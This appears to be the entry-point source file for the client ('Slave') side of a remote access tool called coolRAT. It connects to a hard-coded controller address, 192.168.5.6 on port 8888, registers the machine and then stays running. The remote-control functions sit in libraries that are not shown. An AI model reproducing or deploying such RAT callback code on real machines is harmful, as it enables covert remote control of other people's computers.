using coolRAT.Libs;
using coolRAT.Libs.Connections;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace coolRAT.Slave
{
    class Program
    {
        static void Main(string[] args)
        {
            CAP_Client authClient = new CAP_Client(new IPEndPoint(IPAddress.Parse("192.168.5.6"), 8888));
            Console.WriteLine("Client Authorization Protocol client initialized");
            Console.WriteLine("Registering client...");
            Client localClient = authClient.CreateClient(authClient.RegisterClient());
            Console.WriteLine("Connected!");
            
            Application.Run();
            return;
        }
    }
}
